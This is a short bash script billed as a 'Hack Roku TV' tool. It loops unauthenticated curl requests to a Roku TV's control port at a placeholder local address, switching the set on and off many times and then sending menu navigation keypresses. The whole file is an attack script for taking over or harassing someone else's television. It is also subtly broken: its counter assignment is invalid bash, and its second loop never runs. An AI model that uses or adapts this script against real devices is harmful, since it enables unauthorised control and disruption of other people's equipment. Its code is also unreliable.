#!/bin/bash
# Hack Roku TV 
Hahaha = 1
while [ $Hahaha -le 100 ]
do 
curl -d '' "http://192.168.X.X:8060/keypress/powerOn"
curl -d '' "http://192.168.X.X:8060/keypress/powerOff"
curl -d '' "http://192.168.X.X:8060/keypress/powerOn"
curl -d '' "http://192.168.X.X:8060/keypress/powerOff"
((Hahaha=Hahaha+1))
done
curl -d '' "http://192.168.X.X:8060/keypress/powerOn"
curl -d '' "http://192.168.X.X:8060/keypress/Home"
while [ $Hahaha -le 100 ]
do
curl -d '' "http://192.168.X.X:8060/keypress/left"
curl -d '' "http://192.168.X.X:8060/keypress/down"
((Hahaha=Hahaha+1))
done
echo "Hacked Roku TV"
